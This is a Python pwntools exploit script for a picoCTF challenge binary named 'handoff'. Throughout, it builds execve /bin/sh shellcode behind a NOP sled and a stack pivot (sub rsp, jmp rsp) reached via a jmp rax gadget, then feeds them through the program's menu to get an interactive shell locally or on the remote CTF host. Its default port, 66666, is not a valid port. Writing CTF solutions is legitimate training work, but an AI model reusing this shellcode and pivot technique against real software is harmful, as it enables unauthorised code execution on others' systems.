#!/usr/bin/env python3
from pwn import *
import sys
import time
import argparse

# Configuration
DEBUG = False
REMOTE_HOST = 'shape-facility.picoctf.net'
REMOTE_PORT = 66666  # Default port
BINARY_PATH = './handoff'

# Parse command-line arguments
def parse_args():
    parser = argparse.ArgumentParser(description='Exploit script for handoff challenge')
    parser.add_argument('-p', '--port', type=int, help='Remote port to connect to', default=REMOTE_PORT)
    parser.add_argument('-r', '--remote', action='store_true', help='Connect to remote server instead of local binary')
    return parser.parse_args()

# Exploit parameters
NOP_SLED_SIZE = 36
BUFFER_OFFSET = 726  # Distance from rsp to shellcode buffer
ROP_PADDING_SIZE = 20
JMP_RAX_ADDR = 0x40116c  # Address from ROPgadget

def setup_environment():
    """Configure the exploit environment"""
    # Load the binary
    binary = ELF(BINARY_PATH)
    context.binary = binary
    context.arch = 'amd64'
    
    if DEBUG:
        context.log_level = 'debug'
        print("[+] Set architecture to amd64")
    
    return binary

def generate_shellcode():
    """Create shellcode with NOP sled"""
    # Shellcode that spawns /bin/sh
    shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
    
    # Prepend NOP sled
    padded_shellcode = b"\x90" * NOP_SLED_SIZE + shellcode
    
    if DEBUG:
        print(f"[+] Shellcode length: {len(shellcode)} bytes")
        print(f"[+] Total payload size: {len(padded_shellcode)} bytes")
    
    return padded_shellcode

def create_rop_chain(binary):
    """Create ROP chain for stack pivot"""
    rop = ROP(binary)
    
    # Get jmp rax gadget (either from hardcoded address or by searching)
    if JMP_RAX_ADDR:
        jmp_rax_addr = JMP_RAX_ADDR
        if DEBUG:
            print(f"[+] Using hardcoded jmp rax gadget at: {hex(jmp_rax_addr)}")
    else:
        # Try to find jmp rax gadget
        jmp_rax = rop.find_gadget(['jmp rax'])
        if jmp_rax:
            jmp_rax_addr = jmp_rax[0]
            print(f"[+] Found jmp rax gadget at: {hex(jmp_rax_addr)}")
        else:
            # Try alternative gadgets
            call_rax = rop.find_gadget(['call rax'])
            if call_rax:
                jmp_rax_addr = call_rax[0]
                print(f"[+] Using alternative - call rax gadget: {hex(jmp_rax_addr)}")
            else:
                print("[-] Error: Could not find jmp rax or call rax gadgets")
                print("    Try: ROPgadget --binary ./handoff | grep 'jmp rax'")
                exit(1)
    
    # Create stack pivot to reach our shellcode
    stack_pivot = asm(f"""
        nop
        nop
        sub rsp, {BUFFER_OFFSET}  # Move stack pointer to our shellcode buffer
        jmp rsp                   # Jump to execute our shellcode
    """)
    
    # Build the final ROP payload
    rop_payload = stack_pivot.ljust(ROP_PADDING_SIZE, b"\x90") + p64(jmp_rax_addr)
    
    if DEBUG:
        print(f"[+] ROP payload size: {len(rop_payload)} bytes")
    
    return rop_payload

def build_full_payload(shellcode, rop_payload):
    """Construct the complete exploit payload"""
    return (
        b"1\n"              # Option 1: Add recipient
        b"A\n"              # Recipient name (arbitrary)
        b"2\n"              # Option 2: Send message
        b"0\n"              # Select recipient index 0
        + shellcode + b"\n"  # Send shellcode as message
        b"3\n"              # Option 3: Exit
        + rop_payload + b"\n" # Feedback with ROP chain
    )

def exploit():
    """Main exploit function"""
    # Parse arguments
    args = parse_args()
    port = args.port
    
    binary = setup_environment()
    shellcode = generate_shellcode()
    rop_payload = create_rop_chain(binary)
    full_payload = build_full_payload(shellcode, rop_payload)
    
    # Write payload to file for debugging
    with open("input_pico.txt", "wb") as f:
        f.write(full_payload)
    
    # Launch process
    if args.remote:
        p = remote(REMOTE_HOST, port)
        print(f"[+] Connected to remote server {REMOTE_HOST}:{port}")
    else:
        p = process(BINARY_PATH)
        print(f"[+] Started local process '{BINARY_PATH}'")
    
    # Send exploit
    p.send(full_payload)
    
    try:
        # # Try to get flag if remote
        # if 'remote' in sys.argv:
        #     p.sendline(b"cat flag.txt")
        
        # Get output
        output = p.recvline().decode()
        print(output)
        
    except EOFError:
        print("[-] Connection closed")
    
    # Funny prompt before interactive shell
    user_response = input("\n[?] Do you want to handoff now? :) (yes/no): ")
    if user_response.lower() != "yes":
        print("See you next time~")
        return
    
    # Interactive shell
    print("\n[+] Dropping into interactive shell...\n")
    p.interactive()

if __name__ == "__main__":
    exploit()
